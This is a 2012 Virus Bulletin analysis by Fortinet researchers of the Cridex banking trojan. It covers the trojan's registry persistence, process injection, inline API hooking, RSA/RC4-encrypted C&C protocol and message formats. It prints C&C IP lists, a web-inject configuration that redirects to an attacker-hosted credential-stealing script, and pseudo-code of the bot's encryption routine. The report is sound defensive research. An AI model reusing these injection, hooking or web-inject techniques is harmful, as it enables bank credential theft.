@@ -1,0 +1,369 @@
+Cridex botnet preview
+2012-10-10
+
+Carmen Liang
+Fortinet
+,
+Canada
+
+Neo Tan
+Fortinet
+,
+Canada
+Editor:
+Helen
+
+Martin
+Abstract
+Carmen Liang and Neo Tan focus on a detailed analysis of the Cridex banking trojan's injection routine, communication protocol, encryption scheme and working mechanism in order to shed light on the development path of the three most recent generations of Cridex bots.
+Copyright © 2012 Virus Bulletin
+
+Cridex is a trojan that steals bank account information from its victims. It is programmed in object oriented C++. The Cridex botnet is centralized, communicating with its C&C server regularly to retrieve the latest configuration files and corresponding binary updates. Some generations use a combined cryptographic system consisting of public- and symmetric-key cryptography to secure communication between the bot and C&C server. Today, there are four main generations of Cridex bots. The first, generation 0, was discovered around the end of 2011, and has no encryption at all. The three later generations have become more active over the last couple of months. In this article, we will focus on a detailed analysis of the Cridex injection routine, communication protocol, encryption scheme and working mechanism in order to shed light on the development path of the three recent generations of Cridex bots.
+
+Injection routine
+When the trojan launches, it first drops itself into the %App Data% folder and writes the name of the dropped file to the autorun registry entry (e.g. HKCU\Software\Microsoft\Windows\CurrentVersion\Run\KB%8d.exe). The filename starts with the letters ‘KB’, followed by an eight-digit number derived from the victim’s volume serial number. The trojan will delete itself using a batch file once it has run from the dropped file.
+Next, it checks the current OS environment and acts accordingly. If it is in a 64-bit environment, only the communication routine will be executed. Otherwise, it goes through a list of all the currently running processes, and injects itself into processes that have the right access and security identifier (SID). It then allocates a block of memory containing a copy of itself inside the targeted process. Then it uses CreateRemoteThread to run the malicious routine.
+
+Communication protocol and encryption scheme
+
+Gather local machine information
+Before the bot communicates with the C&C server, it first gathers the basic information from the victim machine, including serial number, computer name, version information and a hash value of the user’s security identity. All of this information will be sent to the C&C server.
+
+Communication protocol
+The following is a partial list of C&C server IPs and their corresponding geographic locations (Figure 1).
+110.234.150.163
+123.49.61.59
+173.203.96.79
+180.235.150.72
+184.106.189.124
+190.81.107.70
+200.169.13.84
+202.143.147.35
+203.172.252.26
+203.172.252.29
+203.217.147.52
+210.56.23.100
+211.44.250.173
+219.94.194.242
+31.17.189.212
+41.168.5.140
+58.68.2.214
+64.94.164.18
+83.143.134.23
+83.238.208.55
+85.226.179.185
+89.111.176.87
+91.121.103.143
+95.142.167.193
+97.74.75.172
+Figure 1. C&C server geographic locations.
+After gathering the information, the bot will try to communicate with one of the C&C servers. The communication routine is injected into every process that the bot has the access rights to open. It has mutex and event checks to ensure that only one thread at a time executes the communication routine in order to avoid data sharing conflicts. Its primary goal is to retrieve the configuration file and binary updates from the C&C server. The bot communicates with the server using both HTTP and a direct use of TCP. The direct use of TCP is solely to create a connection to the back server (which is different from the C&C server), whose IP address is in the configuration file. Usually (in generations 1 and 2), after sending a plain-text message detailing the victim’s system information, it just keeps the connection alive and waits for the back server’s command. It also has the ability to archive, search and execute local files. The direct use of the TCP protocol is apparently the botmaster’s last resort if the bot doesn’t work as expected. This protocol is not designed to work on demand. If the bot pool grows in scale, the back server will eventually need to handle numerous ‘KEEP ALIVE’ requests, which will be similar to launching a DDoS attack on the back server. Figure 2 shows the communication between the bot and the back server.
+Figure 2. Back connection
+(A larger verison of Figure 2 can be viewed here.)
+The thread that uses the HTTP protocol is the main method the bot uses to communicate with the C&C server to retrieve the configuration file and get binary updates.
+
+Communication encryption scheme
+The communication encryption scheme varies from generation to generation: both the first and second generation use a customized hybrid cryptographic system, but the third generation uses SSL encrypted communication. Since the second generation introduced an XML formatted configuration file, the data for this generation was encoded in Base64 (step 1 below). The customized cryptographic system is an encryption system which combines public-key cryptography (RSA) with symmetric-key cryptography (RC4), so that it has both the confidentiality of non-symmetric encryption and the efficiency of symmetric encryption. The following are the steps involved in the second generation encryption scheme:
+It uses CryptStringToBinaryA to decode the encrypted CERT_PUBLIC_KEY_INFO structure from base64 format to binary. In all variants, the base64 data is MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBi QKBgQCvR7x8oHW63g45dwL84Xyga4jdsEUyYc9taOLTZ+kEhwauB7UbvXliNZZsq1HzsNgz+Ge7j VT2nyBIvDwx6CozX0iNM2QG7ZalwB6zBVyvpg TNTQqE8ODZrDGIkabg4OT3YeRrux4Z8GZ14Jja /jITSQZBMvsWguP/wFpUJ35v2wIDAQAB.
+Then it calls CryptDecodeObjectEx to decrypt the binary data using parameters dwCertEncodingType= X509_ASN_ENCODING and lpszStructType= X509_PUBLIC_KEY_INFO to obtain the decoded CERT_PUBLIC_KEY_INFO structure.
+After using CryptImportPublicKeyInfo to import the public key, it calls CryptGenKey with parameter Algid=CALG_RC4 to generate a temporary RC4 key, which is the session key.
+It uses CryptExportKey to export the session key with encryption using the public key from step 2. The parameter dwBlobType is set to SIMPLEBLOB, so the output of this call will be in the following format:
+struct SimpleBLOB {                 struct BLOBHEADER {
+
+BLOBHEADER  blobheaderStruc;        BYTE    bType;
+ALG_ID     algid;                   BYTE    bVersion;
+BYTE       encryptedKey[0x80];      WORD    reserved;
+ALG_ID  aiKeyAlg;
+}                                  }
+Figure 3. BLOBHEADER and encrypted session key.
+‘SimpleBLOB’ in Figure 3 indicates that this is a SIMPLEBLOB, the session key is encrypted using an RSA public key, and the session key itself is an RC4 key. The RC4 key will be sent to the C&C server because the server does not know what key is generated by the client and used to encrypt the message. And it can only be decrypted using the C&C server’s private key.
+It then uses the RC4 key to encrypt the plain-text message with the following format:
+struct Message_Packet {
+DWORD    magicWORD;   //in this variant, it uses “DEADBEEF”
+DWORD    msgSize;     //the size of this whole message
+DWORD    keyExpFlag;  //if the RC4 key is exported successfully
+BYTE     encryptedKey[0x80];  //exported RC4 key, encrypted
+BYTE     sha1ofMsg[0x14];     //SHA1 value of the following encrypted message
+BYTE     encryptedMsg[msgLen];  //the message encrypted using RC4
+}
+
+It only copies the encryptedKey from the SimpleBLOB structure to form this message, stripping the BLOBHEADER and the algorithm ID. Therefore, the C&C server assumes the encrypted key is an RC4 key exported in SimpleBLOB format, and that the algorithm will be RSA.
+(For more details of the encryption steps, please see the simulated pseudo code in the Appendix.)
+The received packet structure is very similar to the struct Message_Packet described above, except the BYTE encryptedKey[0x80] field is substituted with BYTE signatureRecvMsg[0x80]. To decrypt the encryptedMsg, the bot simply calls CryptDecrypt using the same RC4 session key as is stored in the memory. In order to check for the integrity of the received message, the bot calls CryptVerifySignatureW with hPubKey set to the imported public key and the pbSignature pointing to the signature RecvMsg.
+
+Communication data structure
+
+Send message data structure
+The message content is in ‘plain text’. The structure of these messages is very different across the three generations. The first data sent to the server has the following layout:
+First generation
+The data is in binary format, the following is its pseudo struct code:
+struct first_sending_message {
+DWORD    size_of_message
+WORD     unknown marker
+DWORD    size_of_header
+DWORD    size_of_data
+WORD     unknown_marker
+WORD     service_pack_major_version
+WORD     service_pack_minor_version
+WORD     windows_major_version
+WORD     windows_minor_version
+BYTE     computer_architecture
+BYTE     null_end_marker
+DWORD    end_of_data_section
+DWORD    size_of_end_marker
+DWORD    end_of_message
+WORD     computer_name
+BYTE     5f_marker
+QWORD    volume_serial_number
+QWORD    register_name (the condensed USID)
+}
+Second generation
+The following is an example of the message:
+<message set_hash=”” req_set=”1” req_upd=”1”>
+<header>
+<unique>HL_AC197B6886B8B695</unique>
+<version>105</version>
+<system>86320</system>
+<network>nt</network>
+</header>
+<data></data>
+</message>
+We can see from this example that it uses XML format. ‘req_set’ describes whether the initial set-up is successful. ‘req_upd’ describes whether it is requesting an update. The ‘unique’ tag contains basic computer information including computer name, volume serial number and register name. This makes up the unique ID for the victim’s computer. The ‘version’ tag contains the system version value. The ‘system’ tag contains a structure describing the system information, which is a little redundant alongside the ‘version’ tag. For example, 86320 in hex is 0x15130, and each byte indicates a specification of the current OS. The first ‘1’ means the system is a VER_NT_WORKSTATION; ‘5’ is the MajorVersion; ‘1’ is the MinorVersion; ‘3’ is the ServicePackMajor; ‘0’ is the ServicePackMinor. The ‘data’ tag contains the stolen information.
+Third generation
+The structure of the packet changed the most in this generation. It contains some garbage data (the sums) in the middle of the packets. The most important tags, ‘unique’ and ‘data’, are still the same as in the second generation. It also contains the injected process filename.
+struct message_packet {
+DWORD    magicWord;  //new magic word “85 04 08 FF”
+DWORD    packetSize;
+DWORD    reqSet;
+DWORD    reqUpd;
+DWORD    sytemTimeStamp;
+DWORD    botVer;  //bot version
+DWORD    verBuildNum;
+WORD     spMajorVer;
+WORD     spMinorVer;
+DWORD    offsetToUnique;
+DWORD    uniqueSize;
+DWORD    sum1;  //sum of the above 2 DWORDs
+DWORD    fileNameSize;  //installer file name
+DWORD    sum2;  //sum of the above 2 DWORDs
+DWORD    dataSize;
+DWORD    sum3;  //sum of the above 2 DWORDs
+BYTE     unique[uniqueSize];
+BYTE     fileName[fileNameSize];  //injected process filename
+BYTE     data[dataSize];
+}
+
+Received message data structure
+The data structure of the received messages is not only different across generations, but also different from the structure of the sending messages.
+First generation
+The messages are in binary format. The message is composed in a huge section, which is labelled ‘0x0A’ and later will be divided into many sections and subsections. All sections and subsections can be generalized into the following data structure:
+struct general_section_layout{
+DWORD size_of_section
+DWORD label_id
+BYTE  section_content [size_of_section_8]
+}
+
+Inside this huge section there are generally four types of sections. These are labelled ‘0x80’, ‘0x82’, ‘0x83’ and ‘0x84’ in the label_id area. Most of the injected HTML code is in label_83. The details of the structure of the sections are as follows:
+struct label_80 {
+DWORD size_of_section
+DWORD label_id
+BYTE  section_content [size_of_section_8] (URL, start with ‘*’ and end with ‘* ‘)
+}
+
+struct label_82 {
+DWORD size_of_section
+DWORD label_id
+BYTE  section_content [size_of_section_8]
+(pattern, start with ‘*’ and end with ‘* ‘; redirect, content marked after ‘* ‘)
+}
+
+struct label_84 {
+DWORD size_of_section
+DWORD label_id
+BYTE  ip_addresses [size_of_section_8]
+}
+
+struct label_83 {
+DWORD size_of_section
+DWORD label_id
+DWORD end_of_section_header
+DWORD zero_marker
+DWORD url_length
+BYTE  URL (start with ‘*’ and end with ‘* ‘) [url_length]
+DWORD size_of_subsection_1
+DWORD 1st_zero_delimiter_offset
+DWORD 2nd _zero_delimiter_offset
+DWORD 3rd _zero_delimiter_offset
+BYTE  subsection (html code) [size_of_subsection_1}
+DWORD size_of_subsection_2
+DWORD 1st_zero_delimiter_offset
+DWORD 2nd _zero_delimiter_offset
+DWORD 3rd _zero_delimiter_offset
+BYTE  subsection (html code) [size_of_subsection_2]
+DWORD size_of_subsection_3
+...(continue until section ends)
+}
+label_80 parses the URLs of the targeted sites and stores them in a table in the .data section of the current process.
+There is a maximum of 200 entries.
+label_82 parses ‘jqueryaddonsv2\.js’ and ‘http://***/cp.php&rsquo; and stores the result in the .data section of the current process.
+label_83 hashes the HTML code respectively into the .data section of the current process.
+There is a maximum of 100 entries. Each entry represents a section of the HTML code that is targeted to a specific site. Each section can have up to three subsections.
+label_84 stores the IP address to the .data section of the current process.
+Second generation
+This generation uses XML format. It mainly has two big branches, which are <settings> and <commands>. The content in the <settings> branch shares some similarities with the content of the first generation. There are five sub-branches under the <settings> branch, which are <httpshots>, < formgrabber>, <redirects>, <bconnect> and <httpinjects>. The content in <httpshots> is similar to the URL of label_80. The content in <redirects> is similar to the content of label_82. Interestingly, the IP addresses for <bconnect> and label_84 are exactly the same: 31.184.192.195:443. The second generation has introduced the <formgrabber> functionality, targeting only www.facebook.com for the time being. There are eight types of commands under the <command> branch. Each type is associated with a set of corresponding instructions in the injected code. Figure 4 shows the XML structure of the received message.
+Figure 4. XML structure of the configuration file.
+Third generation
+The third generation uses a new magic word, ‘85 04 08 FF’, instead of ‘DEADBEEF’ which was used by the previous two generations. It abandons the XML structure, instead returning to the binary structure with labels as seen in the first generation. However, the label values have changed to integer numbers between 0 and 5.
+
+Command and control
+In all generations there is a special thread that is dedicated to handling the commands that are stored in the registry. Since the structure of these commands is different, the methods of handling them must be different.
+First generation
+Type_1 – downloads file from a URL and runs it
+Type_2 – writes a log file
+Type_3 – creates a CAB file
+Type_4 – creates an auto-reset event
+Type_5 – deletes cookies.
+Second generation
+Type_1 – stores update file obtained from the configuration file in %TMP% as a four-character temporary file and runs it
+Type_2 – downloads file from a URL and runs it
+Type_3&4 – writes log file
+Type_5 – creates cookies CAB file then deletes cookies
+Type_6 – deletes cookies
+Type_7 – creates an auto-reset event
+Type_8 – gets current system time and private key and stores them in the log file.
+Third generation
+Type_1 – stores update file obtained from the configuration file in %TMP% as a four-character temporary file and runs it
+Type_2&3 – downloads file from a URL and runs it
+Type_4 – writes log file
+Type_5 – deletes Firefox cookies
+Type_6 – deletes Flash cookies
+Type_7 – creates CAB file
+Type_8 – gets current system time and private key and stores them in the log file
+Type_9 – creates event.
+
+Inline hook of current process API
+The hooking technique the bot uses is called inline hooking. The idea is to redirect the call flow to the malicious routine at the entry point of the hooked API. For example, in Figure 5, this is in the memory of the nspr4.dll module of the firefox.exe process. It replaces the API’s entry code 8b 44 24 04 8b with e9 3b 56 32 ff, so the call to PR_Connect will be redirected to the malicious subroutine 0x15D830, inside which there is a dummy subroutine at 0x151010. The dummy subroutine is initially formed by a series of NOPs (0x90). During the hooking process, the overwritten codes are saved to the dummy subroutine at 0x151010. An unconditional jump is also written to lead the execution flow back to the original API. The bot has the algorithm to calculate where the assembly operation line ends, so it can save the entire line of operation, 8b 08, to make sure it will not jump back to the middle of an operation. In Figure 5, it jumps back to 0xE381F6, not 0xE381F5, right after the unconditional jump.
+Figure 5. Inline hooking of nspr4.PR_Connect.
+The bot checks the process it injects into and hooks the corresponding API accordingly.
+For all processes, it tries to hook the following APIs:
+ntdll.NtResumeThread
+ntdll.LdrLoadDll
+Secur32.DeleteSecurityContext
+Secur32.InitializeSecurityContextW
+Secur32.InitializeSecurityContextA
+Secur32.EncryptMessage
+Secur32.DecryptMessage
+If the process imports ws2_32.dll and crypt32.dll (e.g. explorer.exe and iexplorer.exe), it hooks the following APIs as well:
+ws2_32.connect
+ws2_32.send
+ws2_32.WSASend
+ws2_32.recv
+ws2_32.WSARecv
+ws2_32.select
+ws2_32.closesocket
+ws2_32.getaddrinfo
+ws2_32.gethostbyname
+crypt32.PFXImportCertStore
+While if the process is firefox.exe, it hooks the following APIs:
+nspr4.PR_Connect
+nspr4.PR_Write
+nspr4.PR_Read
+nspr4.PR_Poll
+nspr4.PR_Close
+ssl3.ImportFD
+By hooking these APIs, the bot has the ability to mask the URLs received in the browsers and perform a few tasks according to the configuration file. If the URL contains the domain name in the <httpshots> tag or the <formgrabber> tag (e.g. xxxbank.com), the bot will try to match the pattern in the <conditions> tag (e.g. *xxxbank.com.*). If the condition matches, it will inject the HTTP code from the <replacement> tag. With those encryption APIs hooked, it can bypass the site’s traffic encryption protocol such as SSLv3. In this variant the code in the <replacement> tags is all the same:
+<replacement>
+<![CDATA[<script type=”text/javascript” src=”https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js”>;
+</script>
+<script type=”text/javascript” src=”/jqueryaddonsv2.js”>
+</script>   ]]>
+</replacement>
+
+By injecting this code into the page, it triggers a hooking function which redirects any URL matching the pattern ‘.*jqueryaddonsv2\.js.*’ to a malicious JavaScript page: http://69.64.56.232:8080/za/v_01_a/in/cp.php, according to the configuration:
+<redirect>
+<pattern>.*jqueryaddonsv2\.js.*</pattern>
+<process>http://69.64.56.232:8080/za/v_01_a/in/cp.php</process>;
+</redirect>
+Figure 6 shows the source code of an injected page belonging to a financial institution.
+Figure 6. Injected page
+The /jqueryaddonsv2.js is redirected to a JavaScript page that can inject the forms and submit the user’s log-in information to the C&C server.
+In the third generation, the malicious JavaScript is embedded in the legitimate ‘jquery.min.js’ file, which makes the injection more subtle. It seems the malicious JavaScript is still under development. With the exception of the same function that can submit the user’s log-in information, there are cases in the executeActions function that are not implemented yet.
+
+Conclusion
+Although Cridex only has a short history (having first appeared at the end of 2011), the malware has become more aggressive recently. It already has three generations. Each of them has a distinct message data structure and encryption scheme. Its trend is to reuse existing libraries and formats to give the bot more flexibility and extensibility. In each generation updates do not cause it to switch to the newest generation, instead each bot generation retains its own formatting. It seems these samples are the beta versions for the author’s development testing.
+
+Appendix
+//Pseudo code Cridexv2 Encrypt
+
+BOOL fResult = FALSE;
+HCRYPTPROV hProv = NULL;
+HCRYPTHASH hHash = NULL;
+HCRYPTKEY hSessionKey = NULL;
+HANDLE hInFile = INVALID_HANDLE_VALUE;
+HANDLE hOutFile = INVALID_HANDLE_VALUE;
+BOOL finished = FALSE;
+BYTE pbBuffer[OUT_BUFFER_SIZE];
+DWORD dwByteCount = 0;
+DWORD dwBytesWritten = 0;
+LPCTSTR pkeyCipher = _T(“MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCvR7x8oHW63g45dwL84Xyga4jdsEUyYc9taOLTZ+kEhwauB7UbvXliNZZsq1HzsNgz+Ge7jVT2nyBIvDwx6CozX0iNM2QG7ZalwB6zBVyvpgTNTQqE8ODZrDGIkabg4OT3YeRrux4Z8GZ14Jja/jITSQZBMvsWguP/wFpUJ35v2wIDAQAB”);
+CERT_PUBLIC_KEY_INFO *publicKeyInfo;
+DWORD publicKeyInfoLen;
+HCRYPTKEY      hPubKey = 0;
+SimpleBLOB *simpleBLOB = new SimpleBLOB();
+DWORD keyLen;
+
+// Acquire a handle
+CryptAcquireContext(&hProv,NULL,MS_DEF_PROV, PROV_RSA_FULL,CRYPT_VERIFYCONTEXT|CRYPT_SILENT);
+
+//not going to be used in the encryption, only used when calculating the SHA1 of the plain-text message
+CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash);
+
+BYTE* pbSignedMessageBlob = NULL;
+DWORD cbSignedMessageBlob = 0;
+
+//
+// Base64 -> binary
+//
+
+Base64ToBinary(pkeyCipher,0,&pbSignedMessageBlob,&cbSignedMessageBlob);
+CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, pbSignedMessageBlob, cbSignedMessageBlob, CRYPT_DECODE_ALLOC_FLAG, NULL, &publicKeyInfo, &publicKeyInfoLen);
+
+// Get the public key information for the certificate.
+CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, publicKeyInfo, &hPubKey);
+
+CryptGenKey(hProv, CALG_RC4, 0x11, &hSessionKey);
+keyLen = 0x8C;
+CryptExportKey(hSessionKey, hPubKey, SIMPLEBLOB, 0, (BYTE*)simpleBLOB, &keyLen);
+
+do
+
+{
+dwByteCount = 0;
+
+// Now read data from the input file
+ReadFile(hInFile, pbBuffer, IN_BUFFER_SIZE, &dwByteCount, NULL);
+
+if (dwByteCount == 0)
+break;
+
+finished = (dwByteCount < IN_BUFFER_SIZE);
+
+// Encrypt
+fResult = CryptEncrypt(hSessionKey, 0, finished, 0, pbBuffer, &dwByteCount,
+OUT_BUFFER_SIZE);
+
+// Write the encrypted/decrypted data to the output file.
+fResult = WriteFile(hOutFile, pbBuffer, dwByteCount,
+&dwBytesWritten, NULL);
+
+} while (!finished);
+
+_tprintf(_T(“File %s is encrypted successfully!\n”));
+}
+
+/* Cleanup */
+if (hInFile != INVALID_HANDLE_VALUE) CloseHandle(hInFile);
+if (hOutFile != INVALID_HANDLE_VALUE) CloseHandle(hOutFile);
+if (hSessionKey != NULL) CryptDestroyKey(hSessionKey);
+if (hHash != NULL) CryptDestroyHash(hHash);
+if (hProv != NULL) CryptReleaseContext(hProv, 0
